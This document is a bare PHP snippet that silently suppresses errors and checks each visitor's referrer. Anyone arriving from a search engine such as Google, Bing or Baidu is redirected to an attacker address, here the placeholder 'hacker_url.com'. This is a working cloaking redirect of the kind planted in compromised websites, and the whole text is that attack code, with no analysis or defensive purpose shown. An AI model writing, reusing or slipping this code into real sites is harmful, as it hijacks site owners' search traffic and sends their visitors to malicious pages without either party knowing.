<?php
error_reporting(0);
$refer=$_SERVER['HTTP_REFERER'];
$se_list = [
    "google.com", "google.com.hk", "google.com.tw", 
    "yahoo.com", "yahoo.com.tw",
    "bing.com",
    "baidu.com", "sogou.com", "soso.com"
];

foreach ($se_list as $se) {
    if (stristr($refer, $se)) {
        header("location: http://www.hacker_url.com"); //Redirect to this url
        exit();
    }
}